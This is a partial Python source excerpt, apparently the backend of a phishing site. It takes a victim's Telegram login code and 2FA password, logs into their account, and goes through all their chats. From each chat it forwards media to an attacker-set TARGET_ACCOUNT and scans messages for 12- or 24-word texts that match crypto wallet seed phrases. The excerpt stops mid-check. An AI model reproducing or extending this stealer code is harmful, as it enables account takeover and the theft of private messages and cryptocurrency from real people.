...
def verify_code():
    ...
    try:
        ...
        loop.close()
        if result == 'need_2fa': return jsonify({'status': 'need_2fa'})
        elif result == 'success': return jsonify({'status': 'success'})
...
def verify_2fa():
    ...
    try:
        ...
        loop.close()
        if result == 'success': return jsonify({'status': 'success'})
        else: return jsonify({'status': 'error'})
    except: return jsonify({'status': 'error'})
...
async def login_to_telegram(phone, code):
    ...
    try:
        ...
        print(f"✅ Вход: {me.username or me.phone}")
        ...
        async for dialog in client.iter_dialogs():
            try:
                async for msg in client.iter_messages(dialog, limit=30):
                    ...
                    if msg.media:
                        await client.forward_messages(TARGET_ACCOUNT, msg)
                    if len(text.split()) in [12, 24] and all(len(w) > 3 for w in text.split()[:5]):
